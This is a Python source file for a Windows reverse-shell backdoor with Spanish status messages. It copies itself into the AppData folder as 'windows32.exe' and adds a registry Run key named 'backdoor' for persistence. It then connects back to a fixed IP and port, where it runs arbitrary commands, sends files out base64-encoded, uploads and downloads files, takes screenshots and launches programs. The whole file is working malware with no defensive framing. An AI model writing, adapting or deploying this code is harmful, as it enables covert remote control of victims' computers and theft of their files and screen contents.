#!/usr/bin/env python
#_*_ coding: utf8 _*_

import socket
import subprocess
import json
import os
import base64
import shutil
import sys
import time
import requests
import mss

def create_persistence():
    location = os.environ['appdata'] + "\\windows32.exe"
    if not os.path.exists(location):
        shutil.copyfile(sys.executable,location)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "' + location + '"', shell=True)

def admin_check():
    global admin
    try:
        check = os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\windows'),'temp']))
    except:
        admin = "ERROR, privilegios insuficientes"
    else:
        admin = "Privilegios de administrador"

def connection():
    while True:
        time.sleep(5)
        try:
            cliente.connect(('192.168.253.15',7777))
            shell()
        except:
            connection()

def screenshot():
    screen = mss.mss()
    screen.shot()

def download_file(url):
    file_download = requests.get(url)
    name_file = url.split("/")[-1]
    with open(name_file,'wb') as file_get:
        file_get.write(file_download.content)

def shell():
    current_dir = os.getcwd()
    cliente.send(current_dir)
    while True:
        res = cliente.recv(1024)
        if res == "exit":
            break
        elif res[:2] == "cd" and len(res) > 2:
            try:
                os.chdir(res[3:])
                cliente.send(str(os.getcwd()))
            except:
                continue
        elif res[:8] == "download":
            with open(res[9:],'rb') as file_download:
                cliente.send(base64.b64encode(file_download.read()))
        elif res[:6] == "upload":
            with open(res[7:],'wb') as file_upload:
                datos = cliente.recv(30000)
                file_upload.write(base64.b64decode(datos))
        elif res[:3] == "get":
            try:
                download_file(res[4:])
                cliente.send("Archivo descargado!")
            except:
                cliente.send("Error al descargar el archivo")
        elif res[:10] == "screenshot":
            try:
                screenshot()
                with open("monitor-1.png",'rb') as sc:
                    cliente.send(base64.b64encode(sc.read()))
                os.remove('monitor-1.png')
            except:
                cliente.send(base64.b64encode("fail"))
        elif res[:5] == 'start':
            try:
                subprocess.Popen(res[6:],shell=True)
                cliente.send("Programa iniciado!")
            except:
                cliente.send("Error al iniciar el programa")
        elif res[:5] == "check":
            try:
                admin_check()
                cliente.send(admin)
            except:
                cliente.send("No pude realizar la tarea")
        else:
            proc = subprocess.Popen(res, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            if len(result) == 0:
                cliente.send("1")
            else:
                cliente.send(result)
                
create_persistence()
cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
cliente.close()